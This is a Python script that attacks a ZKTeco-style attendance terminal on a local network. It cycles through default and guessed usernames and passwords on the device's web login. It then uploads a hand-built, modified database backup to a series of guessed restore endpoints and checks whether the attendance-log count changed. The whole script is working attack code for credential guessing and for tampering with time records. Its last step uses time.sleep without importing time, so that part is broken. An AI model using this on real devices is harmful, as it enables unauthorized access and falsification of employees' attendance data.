"""Login to ZK webserver and try restore with auth"""
import os
import sys
import io
import gzip
import sqlite3
import requests
import urllib3
urllib3.disable_warnings()

sys.stdout.reconfigure(encoding='utf-8')

DEVICE_IP = '172.16.254.202'
BASE_URL = f'http://{DEVICE_IP}'
WORK_DIR = r'D:/chamcong/zk_fw_attempts/web_restore_test'

# Try multiple credentials from earlier research
CREDENTIALS = [
    ('admin', 'admin'),
    ('admin', '891401'),
    ('1', '891401'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('admin', ''),
    ('', ''),
    ('root', 'solokey'),
    ('administrator', 'admin'),
]

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0'})

# Step 1: Get login page
print('Step 1: Get /csl/login...')
r = session.get(f'{BASE_URL}/csl/login', timeout=15)
print(f'  Status: {r.status_code}, len={len(r.content)}')
print(f'  Cookies: {dict(session.cookies)}')

# Step 2: Try each credential
for username, password in CREDENTIALS:
    print(f'\nStep 2: Login as {username!r}:{password!r}...')
    try:
        r = session.post(f'{BASE_URL}/csl/check',
                         data={'username': username, 'userpwd': password},
                         headers={'Content-Type': 'application/x-www-form-urlencoded',
                                 'Referer': f'{BASE_URL}/csl/login',
                                 'Origin': BASE_URL},
                         timeout=10,
                         allow_redirects=False)
        print(f'  Status: {r.status_code}, len={len(r.content)}, head={r.content[:100]!r}')
        print(f'  Cookies after: {dict(session.cookies)}')

        if r.status_code == 302:
            print(f'  Redirect to: {r.headers.get("Location")}')
        # Follow redirect
        if r.status_code in [200, 302]:
            r2 = session.get(f'{BASE_URL}/csl/main', timeout=10)
            print(f'  GET /csl/main: {r2.status_code}, len={len(r2.content)}, head={r2.content[:100]!r}')

        # If we got authed, try restore
        if 'SessionID' in session.cookies and len(r.content) < 1000 and b'error' not in r.content.lower():
            print(f'  *** LOOKS LIKE AUTH SUCCESS ***')
            break
    except Exception as e:
        print(f'  err: {e}')

# Step 3: With auth session, try restore
print('\n\nStep 3: Test restore with auth session...')

# Use cached modified backup
gz_path = os.path.join(WORK_DIR, 'modified_business.dat.gz')
if not os.path.exists(gz_path):
    print(f'Regenerate {gz_path} first...')
    zkdb_path = os.path.join(WORK_DIR, 'ZKDB.db')
    if os.path.exists(zkdb_path):
        with open(zkdb_path, 'rb') as f:
            zkdb_data = f.read()
        file_size = len(zkdb_data)
        new_tar = bytearray()
        hdr = bytearray(512)
        hdr[0:8] = b'ZKDB.db'
        hdr[100:107] = b'0000755'
        hdr[108:112] = b'0000\x00'
        hdr[116:120] = b'0000\x00'
        size_str = f'{file_size:011o}\x00'.encode()
        hdr[124:124+len(size_str)] = size_str
        hdr[136:148] = b'15252234061\x00'
        hdr[156] = ord('0')
        hdr[257:263] = b'ustar\x00'
        hdr[148:156] = b'        '
        chk = sum(hdr)
        chk_str = f'{chk:06o}\x00 '.encode()
        hdr[148:148+len(chk_str)] = chk_str
        new_tar.extend(hdr)
        new_tar.extend(zkdb_data)
        pad_len = ((file_size + 511) // 512) * 512 - file_size
        new_tar.extend(b'\x00' * pad_len)
        new_tar.extend(b'\x00' * 1024)
        gz_buf = io.BytesIO()
        with gzip.GzipFile(fileobj=gz_buf, mode='wb') as gz_out:
            gz_out.write(bytes(new_tar))
        gz_data = gz_buf.getvalue()
        with open(gz_path, 'wb') as f:
            f.write(gz_data)
    else:
        print('No ZKDB.db, cannot proceed')
        sys.exit(1)

with open(gz_path, 'rb') as f:
    gz_data = f.read()
print(f'Payload: {len(gz_data)} bytes')

# Try various restore endpoints
restore_endpoints = [
    ('/csl/restore', 'POST multipart', {'file': ('businessData.dat', gz_data, 'application/octet-stream')}),
    ('/csl/upload', 'POST multipart', {'file': ('businessData.dat', gz_data, 'application/octet-stream')}),
    ('/csl/data', 'POST multipart', {'file': ('businessData.dat', gz_data, 'application/octet-stream')}),
    ('/csl/import', 'POST multipart', {'file': ('businessData.dat', gz_data, 'application/octet-stream')}),
    ('/form/DataApp?Restore=1', 'POST multipart', {'file': ('businessData.dat', gz_data, 'application/octet-stream')}),
    ('/form/DataApp?Action=Restore', 'POST multipart', {'file': ('businessData.dat', gz_data, 'application/octet-stream')}),
    ('/csl/restore', 'POST raw', None),
    ('/csl/upload', 'POST raw', None),
    ('/csl/data', 'POST raw', None),
]

for ep, method, files in restore_endpoints:
    try:
        if 'multipart' in method:
            r = session.post(f'{BASE_URL}{ep}', files=files, timeout=20)
        else:
            r = session.post(f'{BASE_URL}{ep}', data=gz_data,
                             headers={'Content-Type': 'application/octet-stream'},
                             timeout=20)
        print(f'  {method} {ep}: {r.status_code}, len={len(r.content)}, head={r.content[:60]!r}')
    except Exception as e:
        print(f'  {method} {ep}: err {type(e).__name__}')

# Final verification
print('\nFinal verification:')
time.sleep(3)
r = session.get(f'{BASE_URL}/form/DataApp?style=1', timeout=15)
print(f'GET ?style=1: {r.status_code}, len={len(r.content)}')
if r.status_code == 200 and len(r.content) >= 32:
    count = int(r.content[32:42].rstrip(b'\x00'))
    print(f'  ATTLOG count: {count}')